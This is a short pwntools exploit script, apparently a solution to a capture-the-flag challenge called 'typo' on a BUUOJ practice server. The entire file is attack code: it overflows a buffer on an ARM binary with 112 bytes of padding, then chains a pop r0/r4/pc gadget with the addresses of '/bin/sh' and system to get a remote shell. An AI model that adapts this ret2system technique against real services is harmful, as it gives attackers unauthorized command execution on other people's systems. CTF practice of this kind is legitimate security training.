from pwn import *
context(arch='arm')
# p = process(['qemu-arm', './typo'])
p = remote('node4.buuoj.cn', 29391)
pop_r0_r4_pc = 0x00020904
system_addr = 0x110b4
bin_sh_addr = 0x6c384
p.sendline()
payload = b'a' * 112 + p32(pop_r0_r4_pc) + p32(bin_sh_addr) + p32(0) + p32(system_addr)

p.sendline(payload)

p.sendline(b'exit')

p.interactive()